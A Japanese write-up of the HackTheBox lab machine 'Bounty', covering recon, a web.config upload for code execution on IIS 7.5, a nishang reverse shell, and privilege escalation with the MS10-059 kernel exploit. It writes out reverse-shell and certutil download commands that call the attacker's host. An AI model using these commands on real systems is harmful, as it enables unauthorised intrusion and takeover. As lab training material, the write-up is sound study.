# はじめに
HackTheBoxの攻略などを自分用にまとめたものです。    
主に記録用として記しています.

<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">
GitHub(ペネトレーションテスト用チートシート):
https://github.com/yukitsukai47/PenetrationTesting_cheatsheet
Twitter:@yukitsukai1731

# Bounty
![スクリーンショット 2020-10-21 16.12.17.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/df7afe54-02d3-c032-249f-a4fae537d072.png)

HackTheBox公式より
Bounty is an easy to medium difficulty machine, which features an interesting technique to bypass file uploader protections and achieve code execution. This machine also highlights the importance of keeping systems updated with the latest security patches.

Bountyは、ファイルアップローダーの保護をバイパスしてコード実行を実現する興味深いテクニックを特徴とする、簡単～中難易度のマシンです。このマシンはまた、最新のセキュリティパッチでシステムを最新の状態に保つことの重要性を強調しています。

# Recon(偵察)
Bounty(10.10.10.93)に対して、スキャンを行います。  
まずnmapでスキャンを開始します。

## nmap 

```
nmap -sC -sV -oN nmap/initial 10.10.10.93
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -oN...通常出力

```
# Nmap 7.80 scan initiated Mon Sep 28 03:38:44 2020 as: nmap -sC -sV -oN nmap/initial 10.10.10.93
Nmap scan report for 10.10.10.93
Host is up (0.26s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep 28 03:39:12 2020 -- 1 IP address (1 host up) scanned in 28.83 seconds
```

この結果から、80番ポートでIIS 7.5が動作していることが分かります。  
まずは80番ポートを確認してみますが、ソースコードなどを見ても特にこれといった情報も見つかりませんでした。
![スクリーンショット 2020-10-21 16.13.15.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/18187e6f-9db8-0285-564d-4960275bad13.png)
手がかりとなる情報を掴むために、gobusterを使ってディレクトリ・ファイルの列挙を行っていきます。

## gobuster

```
gobuster dir -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx,txt -t 50 -o gobuster/initial
```

```
kali@kali:~/htb/Bounty$ cat gobuster/initial
/transfer.aspx (Status: 200)
/UploadedFiles (Status: 301)
/uploadedFiles (Status: 301)
/uploadedfiles (Status: 301)
```

いくつか列挙することができました。  
まずはtransfer.aspxを見てみると、ファイルをアップロードする機構であることが分かります。  
IISで動いていることが分かっているので、kaliに搭載されているcmd.aspxなどのwebshellファイルをアップロードしてみますが、アップロードはできませんでした。
![スクリーンショット 2020-10-21 15.44.38.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/c530000c-cb56-ad0a-806e-f9faeed5cf58.png)

ここでgoogleで「IIS 7.5 file upload rce」などで検索をすると、以下のような記事を見つけることができました。  
参考リンク：  
https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/
![スクリーンショット 2020-10-21 16.27.21.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/6f9a07d0-2953-f587-6dd1-503c62710584.png)  

参考リンク：  
https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
![スクリーンショット 2020-10-21 16.27.48.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/7a3a78d7-8b47-8326-7d39-5ccd4d5d6674.png)

これらを見てみると、どうやらIIS7.5以降のバージョンではweb.configファイルを通じて、ASPコードを実行することができるようです。  
試しに適当に用意したtest.configをアップロードしてみます。

```
echo aaa > test.config
```

![スクリーンショット 2020-10-21 15.43.39.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/1bfcc3c3-adcb-15fa-c97e-387e39a20b29.png)

アップロードに成功することができました。

# exploitation(侵入)
先ほどのgoogleで検索したコードを用いて、web.configを作成します。  
今回は、web.config内にnishangをkaliで立てたサーバからダウンロードしてきて、実行するpowershellスクリプトを実行させるASPコードを記述します。
![スクリーンショット 2020-10-21 16.07.41.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/9ba8859a-3b55-e80d-4f96-9ca71c216144.png)
次にnishangの用意です。  
参考リンク：  
https://github.com/samratashok/nishang

```
cp /home/kali/pentest/nishang/Shells/Invoke-PowerShellTcp.ps1 /home/kali/htb/Bounty/www/nishang.ps1
```

nishang.ps1(Invoke-PowerShellTCP.ps1)の最後の行に以下の文を追加します。この時IPAddress,Portは自身のkaliのものを指定してください。

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 4444
```

![スクリーンショット 2020-10-21 16.38.38.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/a74ccdc4-29e5-f49d-9b8a-65ffc5279841.png)
あとは、kaliでnishangを提供するためのサーバの立ち上げと、reverse shellの待ち受けを行います。

```
kali@kali:~/htb/Bounty/www$python3 -m http.server 8000
```

```
nc -lvnp 4444
```

準備が完了したら、アップロードした/uploadfiles/web.configを実行します。
![スクリーンショット 2020-10-21 16.45.32.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/d7719f90-c975-b2c9-3120-511a4facdca0.png)
![スクリーンショット 2020-10-21 16.45.42.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/5e02a614-66e7-91a4-5154-cec99b48c1f5.png)


# Privileges Escalation(権限昇格)
権限昇格にはWindows-Exploit-Suggesterを使用します。  
参考リンク：  
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

Windows-Exploit-Suggesterには、systeminfoの情報が必要になるので取得したシェルからsysteminfoを実行してコピーします。
![スクリーンショット 2020-10-21 16.50.42.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/9abf6fec-b0af-8a7a-2814-db12fea1bee3.png)

コピーしたsysteminfoをテキストファイルに記して、Windows-Exploit-Suggesterと同じディレクトリに配置しておきます。
./windows-exploit-suggester.py --update
を実行後、出力されたxlsファイルを指定してスクリプトを実行します。

```
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2020-10-21-mssb.xls --systeminfo Bounty.txt
```

![スクリーンショット 2020-10-21 15.51.03.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/b0c043b9-623f-2f7d-3cfd-1435ee938077.png)
ここでは提案されたエクスプロイトの中から、MS10-059を使用します。  
カーネルエクスプロイトにはSecWikiのものを使います。  
参考リンク：  
https://github.com/SecWiki/windows-kernel-exploits  
このエクスプロイトをBountyマシンに共有します。  
pythonを使ってkaliにサーバを立てて、Bountyからcertutil.exeを使用することでMS10-059.exeをダウンロードします。

```
kali@kali:~/pentest/windows-kernel-exploits/MS10-059$ python3 -m http.server 9001
```

```
C:\windows\temp>certutil -urlcache -split -f http://10.10.14.7:9001/MS10-059.exe MS10-059.exe
```

これで全ての準備が整ったので、kaliで通信を待ち受けて、BountyからMS10-059.exeを実行します。

```
kali@kali:~/$ nc -lvnp 4445
```

```
C:\windows\temp>./MS10-059.exe 10.10.14.7 4445
```

![スクリーンショット 2020-10-21 15.59.13.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/1e14fd18-c3d9-4586-dc71-b41192842148.png)
お疲れ様でした。  
Administrators権限を取得することができました。